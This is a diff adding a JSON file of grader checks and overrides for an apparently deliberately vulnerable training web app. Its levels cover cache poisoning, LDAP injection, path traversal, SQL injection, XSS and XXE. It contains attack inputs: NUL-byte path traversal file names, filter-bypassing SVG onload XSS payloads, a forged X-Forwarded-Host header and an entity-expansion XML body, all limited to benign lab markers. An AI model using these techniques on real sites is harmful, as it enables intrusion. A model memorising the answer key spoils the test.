@@ -1,0 +1,238 @@
+{
+  "cachePoisoning-01": {
+    "points": 0,
+    "check": {
+      "kind": "manual",
+      "value": "Preparación del laboratorio: limpiar caché no es resolver un objetivo."
+    }
+  },
+  "cachePoisoning-02": {
+    "before": [
+      {
+        "route": "CachePoisoning/clearCache",
+        "method": "POST",
+        "params": {
+          "level": "LEVEL_1"
+        }
+      }
+    ],
+    "probe": {
+      "route": "CachePoisoning/LEVEL_1",
+      "method": "GET",
+      "params": {}
+    },
+    "check": {
+      "kind": "all",
+      "checks": [
+        {
+          "kind": "header",
+          "header": "X-Cache-Status",
+          "value": "HIT"
+        },
+        {
+          "kind": "contains",
+          "path": "content",
+          "value": "VA_LAB_L1_MARKER"
+        }
+      ]
+    }
+  },
+  "cachePoisoning-03": {
+    "points": 0,
+    "check": {
+      "kind": "manual",
+      "value": "Comparar dos valores de banner siguiendo los comandos; la receta describe dos solicitudes, no una."
+    }
+  },
+  "cachePoisoning-05": {
+    "before": [
+      {
+        "route": "CachePoisoning/clearCache",
+        "method": "POST",
+        "params": {
+          "level": "LEVEL_2"
+        }
+      }
+    ],
+    "probe": {
+      "route": "CachePoisoning/LEVEL_2",
+      "method": "GET",
+      "params": {}
+    },
+    "check": {
+      "kind": "all",
+      "checks": [
+        {
+          "kind": "header",
+          "header": "X-Cache-Status",
+          "value": "HIT"
+        },
+        {
+          "kind": "contains",
+          "path": "content",
+          "value": "VA_LAB_FILTERED"
+        }
+      ]
+    }
+  },
+  "cachePoisoning-07": {
+    "points": 100,
+    "headers": {
+      "X-Forwarded-Host": "receiver:8081"
+    },
+    "before": [
+      {
+        "route": "CachePoisoning/clearCache",
+        "method": "POST",
+        "params": {
+          "level": "LEVEL_3"
+        }
+      }
+    ],
+    "probe": {
+      "route": "CachePoisoning/LEVEL_3",
+      "method": "GET",
+      "params": {
+        "banner": "VA_LAB_SHARED_HOST"
+      }
+    },
+    "check": {
+      "kind": "all",
+      "checks": [
+        {
+          "kind": "header",
+          "header": "X-Cache-Status",
+          "value": "HIT"
+        },
+        {
+          "kind": "contains",
+          "path": "content",
+          "value": "https://receiver:8081/assets/cache-poisoning-demo.js"
+        }
+      ]
+    }
+  },
+  "ldapInjection-03": {
+    "check": {
+      "kind": "all",
+      "checks": [
+        {
+          "kind": "json",
+          "path": "isValid",
+          "value": true
+        },
+        {
+          "kind": "contains",
+          "path": "content.users",
+          "value": "alice"
+        }
+      ]
+    }
+  },
+  "ldapInjection-05": {
+    "points": 0,
+    "check": {
+      "kind": "manual",
+      "value": "El fixture desplegado rechazó las credenciales sugeridas. Explorar los controles de filtro y autenticar únicamente cuentas de entrenamiento; no prometer bypass con este valor."
+    }
+  },
+  "pathTraversal-02": {
+    "params": {
+      "fileName": "../training/va-training.txt"
+    },
+    "description": "Salir del directorio scripts/PathTraversal y leer la fixture scripts/training/va-training.txt del classpath. El target usa distribución expandida; no es una lectura arbitraria del host."
+  },
+  "pathTraversal-05": {
+    "points": 0,
+    "check": {
+      "kind": "manual",
+      "value": "La codificación estándar del cliente no produjo lectura de la fixture en este filtro. Seguir el análisis de mayúsculas/minúsculas y la guía; sin puntos por una expectativa estática."
+    }
+  },
+  "pathTraversal-06": {
+    "points": 0,
+    "check": {
+      "kind": "manual",
+      "value": "Práctica de transporte y filtros: la receta original no leyó la fixture en la integración expandida."
+    }
+  },
+  "pathTraversal-08": {
+    "params": {
+      "fileName": "../training/va-training.txt\u0000UserInfo.json"
+    },
+    "description": "El cliente codifica un NUL real como %00. El handler corta allí y lee la fixture del classpath, nunca una ruta del host."
+  },
+  "pathTraversal-09": {
+    "params": {
+      "fileName": "../training/va-training.txt\u0000UserInfo.json"
+    },
+    "description": "Contrastar el corte en NUL con el filtro de URL del nivel 8 usando exclusivamente la fixture."
+  },
+  "pathTraversal-11": {
+    "points": 0,
+    "check": {
+      "kind": "manual",
+      "value": "La receta con %00 literal no demostró lectura. Comparar transporte y filtro sin puntuar un cuerpo vacío."
+    }
+  },
+  "sqlInjection-04": {
+    "check": {
+      "kind": "contains",
+      "value": "Invalid ID format.",
+      "status": 400
+    }
+  },
+  "xss-01": {
+    "headers": {}
+  },
+  "xss-04": {
+    "headers": {}
+  },
+  "xss-05": {
+    "headers": {},
+    "params": {
+      "value": "<SVG onload=\"document.body.dataset.vaLab=`VA_XSS_HTML_L2`\"></SVG>"
+    },
+    "description": "La expresión regular también bloquea svg en minúsculas porque s pertenece a su clase de caracteres. La variante SVG mayúscula permite observar el marcador DOM benigno."
+  },
+  "xss-07": {
+    "headers": {},
+    "probe": {
+      "route": "PersistentXSSInHTMLTagVulnerability/LEVEL_1",
+      "method": "GET",
+      "params": {}
+    },
+    "probe_tool": "browser_probe"
+  },
+  "xss-08": {
+    "headers": {},
+    "params": {
+      "comment": "<span>VA_BEFORE_NUL</span>\u0000<svg onload=\"document.body.dataset.vaLab=`VA_XSS_PERSIST_L6`\"></svg>"
+    }
+  },
+  "xss-10": {
+    "points": 0,
+    "tool": "http_request",
+    "check": {
+      "kind": "manual",
+      "value": "El nivel 8 rechaza la entrada antes de persistir: no se debe esperar ejecución del marcador."
+    }
+  },
+  "xss-12": {
+    "points": 0,
+    "tool": "http_request",
+    "check": {
+      "kind": "manual",
+      "value": "El filtro de img LEVEL_5 no produjo ejecución del marcador en la distribución probada. Analizar el control y transporte; no puntuar reflexión ni un cuerpo vacío."
+    }
+  },
+  "xxe-06": {
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE book [<!ENTITY p \"VA_LAB_OK\"><!ENTITY p1 \"&p;&p;&p;\">]><book><name>&p1;</name><isbn>6</isbn><author>a</author><publisher>p</publisher><others>ok</others></book>",
+    "check": {
+      "kind": "json",
+      "path": "content.name",
+      "value": "VA_LAB_OKVA_LAB_OKVA_LAB_OK"
+    },
+    "description": "Expansión acotada a 3 repeticiones de un marcador de 9 caracteres, por debajo de NAME VARCHAR(30). No usar cargas exponenciales ni DoS."
+  }
+}
